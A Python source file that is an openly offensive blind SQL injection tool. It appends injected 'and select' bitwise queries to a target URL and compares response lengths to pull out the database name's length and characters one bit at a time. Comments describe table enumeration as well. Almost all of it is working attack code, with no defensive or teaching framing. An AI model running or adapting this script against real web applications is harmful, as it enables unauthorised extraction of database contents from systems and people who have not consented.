import requests
from requests.utils import requote_uri
import bitwise_public


class GetDbTableInformationClass:
    # Insert target url
    TARGET_URL = ''

    def __init__(self):
        self.SUCCESS_LENGTH = len(requests.get(self.TARGET_URL).text)
        # Using DB name length
        self.db_name_length = 0
        # Using DB name
        self.db_name = ""
        # Tables number in DB
        self.tables_number = 0
        # List of tables name length in DB
        self.tables_name_length = []
        # List of tables name in DB
        self.tables_name = []

    # SQL Injection method
    def get_db_name_length(self):
        length_bin_list = []
        for shift_idx in range(7, -1, -1):
            res_length = len(requests.get(requote_uri(self.TARGET_URL + '\' and select ' +
                                                      bitwise_public.DATA_LENGTH_SHIFT_QUERY.format('db_name()',
                                                                                                    shift_idx))).text)
            length_bin_list.append(int(res_length == self.SUCCESS_LENGTH))

        self.db_name_length = bitwise_public.parsing_bin_list_to_decimal(length_bin_list)
        print(self.db_name_length)

    def get_db_name(self):
        db_name_char_list = []
        for db_name_idx in range(self.db_name_length):
            db_name_char_bin_list = []
            for shift_idx in range(7, -1, -1):
                res_length = len(requests.get(requote_uri(self.TARGET_URL + '\' and select ' +
                                                          bitwise_public.DATA_BIT_SHIFT_QUERY.format('db_name()',
                                                                                                     db_name_idx,
                                                                                                     shift_idx,
                                                                                                     0))).text)
                db_name_char_bin_list.append(int(res_length == self.SUCCESS_LENGTH))
            db_name_char_list.append(bitwise_public.parsing_bin_list_to_char(db_name_char_bin_list))

        self.db_name = ''.join(db_name_char_list)
        print(self.db_name)

    # Getter
    def db_name_getter(self):
        return self.db_name

    def tables_name_getter(self):
        return self.tables_name
